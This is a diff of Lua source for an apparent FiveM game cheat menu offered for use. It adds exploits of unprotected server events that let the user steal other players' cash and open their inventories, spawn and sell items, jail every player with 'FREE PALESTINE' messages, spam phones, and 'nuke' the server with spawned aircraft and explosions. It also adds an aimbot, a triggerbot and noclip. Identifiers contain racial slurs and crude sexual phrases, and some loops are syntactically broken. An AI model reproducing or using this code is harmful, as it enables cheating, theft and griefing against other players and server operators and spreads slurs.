+                TriggerServerEvent("bw:Server:AddItem", "pistol_ammo", 30)
+            elseif IhadSexWithMyStepMother.Button("~g~Revive Player By ID") then
+                local serverID = GetKeyboardInput("Enter Player Server ID:")
+                TriggerServerEvent('qb-admin:server:revivePlayer', serverID)
+				TriggerServerEvent('ipx-admin:server:revivePlayer', serverID)
+            elseif IhadSexWithMyStepMother.Button("Steal Player Money By ID") then
+                local serverID = GetKeyboardInput("Enter Player ID:")
+                TriggerServerEvent("police:server:SeizeCash", serverID)
+            elseif IhadSexWithMyStepMother.Button("~b~ADD and SELL Diamond") then
+                TriggerServerEvent("QBCore:Server:AddItem", "diamond", 1)
+                TriggerServerEvent('QBCore:Server:startSelling', "diamond")
+                TriggerServerEvent('QBCore:Server:startSelling', "diamond")
+				TriggerServerEvent("ipxCore:Server:AddItem", "diamond", 1)
+                TriggerServerEvent('ipxCore:Server:startSelling', "diamond")
+                TriggerServerEvent('ipxCore:Server:startSelling', "diamond")
+            elseif IhadSexWithMyStepMother.Button("~v~Open Admin Menu") then
+                TriggerEvent('qb-admin:client:openMenu', source, group, dealers)
+				TriggerEvent('ipx-admin:client:openMenu', source, group, dealers)
+            elseif IhadSexWithMyStepMother.Button("Open Inventory By ID") then
+                local serverID = GetKeyboardInput("Enter Player Server ID:")
+                TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", serverID)
+            end
+			
+		
+        
+        
+        
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vrp') then
+            if IhadSexWithMyStepMother.Button("~y~VRP Toggle Handcuffs") then
+                vRP.toggleHandcuff()
+            elseif IhadSexWithMyStepMother.Button("~y~VRP Clear Wanted Level") then
+                vRP.applyWantedLevel(0)
+            end
+        
+        elseif IhadSexWithMyStepMother.IsMenuOpened('settingslol') then
+        if IhadSexWithMyStepMother.MenuButton('~r~About W W B A Menu', 'credits') then end
+        if IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~X', menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
+        currentMenuX = currentIndex
+        selectedMenuX = currentIndex
+        for i = 1, #menulist do
+            IhadSexWithMyStepMother.SetMenuX(menulist[i], menuX[currentMenuX])
+        end
+        end) 
+        then
+elseif IhadSexWithMyStepMother.ComboBox('<font color="#E400FF">Menu ~s~Y', menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
+        currentMenuY = currentIndex
+        selectedMenuY = currentIndex
+        for i = 1, #menulist do
+            IhadSexWithMyStepMother.SetMenuY(menulist[i], menuY[currentMenuY])
+        end
+        end)
+        then
+        end
+
+        elseif IhadSexWithMyStepMother.IsMenuOpened('credits') then
+            for _, v in pairs(developers) do 
+				if IhadSexWithMyStepMother.Button(v[1], v[2]) then end 
+			end        
+     
+        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then IhadSexWithMyStepMother.OpenMenu('StupidNiggaPaster')
+	
+		
+		elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then IhadSexWithMyStepMother.OpenMenu('StupidNiggaPaster')
+        
+        elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip() 
+		
+		elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint() 
+		
+		elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end 
+        
+        IhadSexWithMyStepMother.Display()
+        
+       
+        if Demigod then
+            if GetEntityHealth(PlayerPedId()) < 200 then
+                SetEntityHealth(PlayerPedId(), 200)
+            end
+        end
+        
+        if ADemigod then
+            SetEntityHealth(PlayerPedId(), 189.9)
+        end
+ 
+        if Noclipping then
+            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
+            local k = nil
+            local x, y, z = nil
+            
+            if not isInVehicle then
+                k = PlayerPedId()
+                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
+            else
+                k = GetVehiclePedIsIn(PlayerPedId(), 0)
+                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
+            end
+            
+            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
+            
+            local dx, dy, dz = GetCamDirection()
+            SetEntityVisible(PlayerPedId(), 0, 0)
+            SetEntityVisible(k, 0, 0)
+            
+            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
+            
+            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
+                oldSpeed = NoclipSpeed
+                NoclipSpeed = NoclipSpeed * 2
+            end
+            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
+                NoclipSpeed = oldSpeed
+            end
+            
+            if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
+                x = x + NoclipSpeed * dx
+                y = y + NoclipSpeed * dy
+                z = z + NoclipSpeed * dz
+            end
+            
+            if IsDisabledControlPressed(0, 269) then -- MOVE BACK
+                x = x - NoclipSpeed * dx
+                y = y - NoclipSpeed * dy
+                z = z - NoclipSpeed * dz
+            end
+			
+			if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
+                z = z + NoclipSpeed
+            end
+            
+			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
+                z = z - NoclipSpeed
+            end
+            
+            
+            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
+        end
+        
+        if ExplodingAll then
+            ExplodeAll(includeself)
+        end
+        
+        if Tracking then
+            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
+            SetNewWaypoint(coords.x, coords.y)
+        end
+        
+		if FlingingPlayer then
+			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
+			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
+		end
+		
+        if InfStamina then
+            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
+        end
+
+        if SuperJump then
+            SetSuperJumpThisFrame(PlayerId())
+        end
+        
+        if Invisibility then
+            SetEntityVisible(PlayerPedId(), 0, 0)
+        end
+        
+        if Forcefield then
+            DoForceFieldTick(ForcefieldRadius)
+        end
+		
+		
+        
+        if CarsDisabled then
+            local plist = GetActivePlayers()
+            for i = 1, #plist do
+                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
+                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
+                end
+            end
+        end
+        
+        if GunsDisabled then
+            local plist = GetActivePlayers()
+            for i = 1, #plist do
+                if IsPedShooting(GetPlayerPed(plist[i])) then
+                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
+                end
+            end
+        end
+        
+        if NoisyCars then
+            for k in EnumerateVehicles() do
+                SetVehicleAlarmTimeLeft(k, 500)
+            end
+        end
+        
+        if FlyingCars then
+            for k in EnumerateVehicles() do
+                RequestControlOnce(k)
+                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
+            end
+        end
+		
+		if Enable_GcPhone then
+                for i = 0, 450 do
+                    FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", GetPlayerServerId(i), 5000, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
+                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
+                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', 5000, num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
+                    end
+                end
+        
+        if SuperGravity then
+            for k in EnumerateVehicles() do
+                RequestControlOnce(k)
+                SetVehicleGravityAmount(k, GravAmount)
+            end
+        end
+		
+		if RainbowVeh then
+                local u48y34 = k(1.0)
+                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			if ou328hSync then
+                local u48y34 = k(1.0)
+				local ped = PlayerPedId()
+                local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			
+			if ou328hNeon then
+                local u48y34 = k(1.0)
+		    local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+		
+		if Enable_Jail then
+				i = 0, 450 do
+                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
+                    FiveM.TriggerCustomEvent(false, "esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "", 997)
+                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "", 300)
+                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 50000)
+                    FiveM.TriggerCustomEvent(false, "8321hiue89js", GetPlayerServerId(i), 5007, "", 32532532, securityToken)
+                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "", 500324532)
+                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, "js:jailuser", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jailPlayer", GetPlayerServerId(i), 300000, "", 500324532)
+                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jail", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, "esx_policejob:billPlayer", GetPlayerServerId(i), 5000, "")
+                    FiveM.TriggerCustomEvent(false, 'chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."")
+					TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
+					TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
+					TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(i), 45 * 60)
+					TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "SERVER FREE PALESTINE")
+					TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
+					TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
+					end
+				end
+				
+				
+	if Enable_Nuke then
+                Citizen.CreateThread(
+                    function()
+              
+						local dj = 'Avenger'
+                        local dk = 'CARGOPLANE'
+                        local dl = 'luxor'
+                        local dm = 'maverick'
+                        local dn = 'blimp2'
+                        while not HasModelLoaded(GetHashKey(dk)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dk))
+                        end
+                        while not HasModelLoaded(GetHashKey(dl)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dl))
+                        end
+                        while not HasModelLoaded(GetHashKey(dj)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dj))
+                        end
+                        while not HasModelLoaded(GetHashKey(dm)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dm))
+                        end
+                        while not HasModelLoaded(GetHashKey(dn)) do
+                            Citizen.Wait(0)
+                            RequestModel(GetHashKey(dn))
+                        end
+                        for i = 0, 128 do
+                            local dl =
+                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
+                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
+                            end
+                        end
+                )
+            end
+		
+		
+	if nukeserver then
+    Citizen.CreateThread(
+	function()
+        local dg="Avenger"
+        local dh="tula"
+        local di="volatol"
+        local dj="maverick"
+        local dk="bombushka"
+        local al=""
+
+        while not HasModelLoaded(GetHashKey(dh))do
+            Citizen.Wait(0)
+            RequestModel(GetHashKey(dh))
+        end
+
+        while not HasModelLoaded(GetHashKey(di))do
+            Citizen.Wait(0)RequestModel(GetHashKey(di))
+        end
+
+        while not HasModelLoaded(GetHashKey(dg))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dg))
+        end
+
+        while not HasModelLoaded(GetHashKey(dj))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dj))
+        end
+
+        while not HasModelLoaded(GetHashKey(dk))do
+            Citizen.Wait(0)RequestModel(GetHashKey(dk))
+        end
+
+        for bs=0,9 do
+            
+        end
+
+        for i=0,128 do
+            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)
+        end
+		ShowInfo("~g~Fucked :(")
+     end)
+    end
+        
+        if WorldOnFire then
+            local pos = GetEntityCoords(PlayerPedId())
+            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
+            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
+                local targetpos = GetEntityCoords(k)
+                local x, y, z = table.unpack(targetpos)
+                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
+                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
+                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
+                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
+                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
+            end
+            
+            for v in EnumeratePeds() do
+                if v ~= PlayerPedId() then
+                    local targetpos = GetEntityCoords(v)
+                    local x, y, z = table.unpack(targetpos)
+                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
+                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
+                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
+                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
+                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
+                end
+            end
+        end
+		
+
+		
+	
+        
+        if FuckMap then
+            for i = -4000.0, 8000.0, 3.14159 do
+                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
+                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
+                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
+                
+                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
+                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
+                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
+            end
+        end
+		
+        
+        if ClearStreets then
+            SetVehicleDensityMultiplierThisFrame(0.0)
+            SetRandomVehicleDensityMultiplierThisFrame(0.0)
+            SetParkedVehicleDensityMultiplierThisFrame(0.0)
+            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
+            SetPedDensityMultiplierThisFrame(0.0)
+        end
+        
+        if RapidFire then
+            DoRapidFireTick()
+        end
+        
+        if Aimbot then
+            
+            -- Draw FOV
+            if DrawFov then
+                DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
+                DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
+                DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
+                DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
+            end
+            
+            local plist = GetActivePlayers()
+            for i = 1, #plist do
+                ShootAimbot(GetPlayerPed(plist[i]))
+            end
+        
+        end
+        
+        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
+            for k in EnumeratePeds() do
+                if k ~= PlayerPedId() then RageShoot(k) end
+            end
+        end
+        
+        function ShowCross(C,x,y)
+            SetTextFont(0)
+            SetTextProportional(1)
+            SetTextScale(0.0,0.4)
+            SetTextDropshadow(1,0,0,0,255)
+            SetTextEdge(1,0,0,0,255)
+            SetTextDropShadow()
+            SetTextOutline()
+            SetTextEntry("STRING")
+            AddTextComponentString(C)
+            DrawText(x,y)
+        end
+
+        if Crosshair then
+            ShowCross("+",0.495,0.484)
+        end
+        
+        if ShowCoords then
+            local pos = GetEntityCoords(PlayerPedId())
+            DrawTxt("~r~X:~w~ " .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
+            DrawTxt("~r~Y:~w~ " .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
+            DrawTxt("~r~Z:~w~ " .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
+        end
+        
+        if ExplosiveAmmo then
+            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
+            if ret then
+                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
+            end
+        end
+        
+        if ForceGun then
+            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
+            if ret then
+                for k in EnumeratePeds() do
+                    local coords = GetEntityCoords(k)
+                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
+                        local forward = GetEntityForwardVector(PlayerPedId())
+                        RequestControlOnce(k)
+                        ApplyForce(k, forward * 500)
+                    end
+                end
+                
+                for k in EnumerateVehicles() do
+                    local coords = GetEntityCoords(k)
+                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
+                        local forward = GetEntityForwardVector(PlayerPedId())
+                        RequestControlOnce(k)
+                        ApplyForce(k, forward * 500)
+                    end
+                end
+            
+            end
+        end
+        
+        if Triggerbot then
+            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
+            if hasTarget and IsEntityAPed(target) then
+                ShootAt(target, "SKEL_HEAD")
+            end
+        end
+		
+		local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
+			            if IsPedInAnyVehicle(PlayerPedId()) then
+                if driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 5.0)
+                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
+                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                end
+			end			
+ 
+        if not Collision then
+            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
+            for k in EnumerateVehicles() do
+                SetEntityNoCollisionEntity(k, playerveh, true)
+            end
+            for k in EnumerateObjects() do
+                SetEntityNoCollisionEntity(k, playerveh, true)
+            end
+            for k in EnumeratePeds() do
+                SetEntityNoCollisionEntity(k, playerveh, true)
+            end
+        end
+        
+        if DeadlyBulldozer then
+            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
+            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
+            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
+                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
+                DeadlyBulldozer = not DeadlyBulldozer
+            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
+                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                local coords = GetEntityCoords(veh)
+                local forward = GetEntityForwardVector(veh)
+                local heading = GetEntityHeading(veh)
+                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
+                SetVehicleColours(veh, 27, 27)
+                SetVehicleEngineHealth(veh, -3500.0)
+                ApplyForce(veh, forward * 500.0)
+            end
+        end
+        
+        if IhadSexWithMyStepMother.IsMenuOpened('objectlist') then
+            for i = 1, #SpawnedObjects do
+                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
+                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
+            end
+        end
+        
+        if NametagsEnabled then
+            tags_plist = GetActivePlayers()
+            for i = 1, #tags_plist do
+                if NetworkIsPlayerTalking(tags_plist[i]) then
+                    SetMpGamerTagVisibility(ptags[i], 4, 1)
+                else
+                    SetMpGamerTagVisibility(ptags[i], 4, 0)
+                end
+                
+                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
+                    SetMpGamerTagVisibility(ptags[i], 8, 1)
+                else
+                    SetMpGamerTagVisibility(ptags[i], 8, 0)
+                end
+            
+            end
+        end
+        
+        if ANametagsEnabled then
+            local plist = GetActivePlayers()
+            table.removekey(plist, PlayerId())
+            for i = 1, #plist do
+                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
+                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
+                if distance <= 30 then
+                    if ANametagsNotNeedLOS then
+                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(plist[i]) .. "\n~b~Name: " .. GetPlayerName(plist[i]))
+                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
+                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(plist[i]) .. "\n~b~Name: " .. GetPlayerName(plist[i]))
+                    end
+                end
+            end
+        end
+        
+        if LinesEnabled then
+            local plist = GetActivePlayers()
+            local playerCoords = GetEntityCoords(PlayerPedId())
+            for i = 1, #plist do
+                if i == PlayerId() then i = i + 1 end
+                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
+                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
             end
         end
 
-        return replaced
-    end
-
-    local Ibuttons = nil
-    local _buttons = {}
-
-    function FM:SetIbuttons(buttons)
-        buttons = buttons or _buttons
-
-        if not FM:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
-            Ibuttons = FM:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
-
-            while not FM:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
-                Wait(0)
-            end
-        else
-            Ibuttons = FM:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
-
-            while not FM:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
-                Wait(0)
-            end
+	if WeatherChanger then
+	    SetWeatherTypePersist(WeatherType)
+	    SetWeatherTypeNowPersist(WeatherType)
+	    SetWeatherTypeNow(WeatherType)
+	    SetOverrideWeather(WeatherType)
+	end
+        
+        if Radio then
+            PortableRadio = true
+            SetRadioToStationIndex(RadioStation)
+        elseif not Radio then
+            PortableRadio = false
         end
 
-        local sf = Ibuttons
-        local w, h = FM:GetFunction("GetActiveScreenResolution")()
-        FM:GetFunction("BeginScaleformMovieMethod")(sf, "CLEAR_ALL")
-        FM:GetFunction("EndScaleformMovieMethodReturnValue")()
+        if PortableRadio then
+            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
+            SetMobilePhoneRadioState(true)
+            SetMobileRadioEnabledDuringGameplay(true)
+            HideHudComponentThisFrame(16)
+        elseif not PortableRadio then
+            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
+            SetMobilePhoneRadioState(false)
+            SetMobileRadioEnabledDuringGameplay(false)
+            ShowHudComponentThisFrame(16)
+            local radioIndex = GetPlayerRadioStationIndex()
 
-        for i, btn in dict.pairs(buttons) do
-            FM:GetFunction("BeginScaleformMovieMethod")(sf, "SET_DATA_SLOT")
-            FM:GetFunction("ScaleformMovieMethodAddParamInt")(i - 1)
-            FM:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[1])
-            FM:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[2])
-            FM:GetFunction("EndScaleformMovieMethodReturnValue")()
-        end
-
-        FM:GetFunction("BeginScaleformMovieMethod")(sf, "DRAW_INSTRUCTIONAL_BUTTONS")
-        FM:GetFunction("ScaleformMovieMethodAddParamInt")(layout)
-        FM:GetFunction("EndScaleformMovieMethodReturnValue")()
-    end
-
-    function FM:DrawIbuttons()
-        if FM:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
